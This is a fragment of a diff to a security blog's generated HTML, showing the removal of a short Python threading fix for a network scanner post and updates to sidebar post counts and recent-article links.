-    <span class="token keyword">print</span> <span class="token string">'need time %s'</span> <span class="token operator">%</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>====2017-12-15更新</p>
-<p>关于多线程，上面两个的<code>q.join</code>写错了，删掉之后改为:</p>
-<pre class="line-numbers language-none"><code class="language-none">map(lambda x: x.join(), threads)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>扫描<code>/24</code>的主机，花费的时间从8s变为了0.5s，时间不是这么计算的。</p>
-<p>如果上面没有设置线程的daemon，最后运行的时候会一直卡着，因为进程默认不会停的，要这样:</p>
-	
-	</div>
-  <a type="button" href="/2016/04/15/svn-scan.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -662,7 +530,7 @@ start <span class="token operator">=</span> time<span class="token punctuation">
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>51</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>52</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -683,6 +551,10 @@ start <span class="token operator">=</span> time<span class="token punctuation">
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/04/23/sandbox-info-collect.html" ><i class="fa fa-file-o"></i>沙盒环境信息收集</a>
+      </li>
+    
+      <li>
         <a href="/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE.html" ><i class="fa fa-file-o"></i>BrokenSesame-阿里云数据库远程命令执行</a>
       </li>
     
@@ -696,10 +568,6 @@ start <span class="token operator">=</span> time<span class="token punctuation">
     
       <li>
         <a href="/2023/02/14/kafka-rce.html" ><i class="fa fa-file-o"></i>Apache Kafka Connect JNDI注入...</a>
-      </li>
-    
-      <li>
-        <a href="/2023/02/13/cname-hijack-openresty.html" ><i class="fa fa-file-o"></i>利用OpenResty进行域名流量劫持</a>
       </li>
     
   </ul>
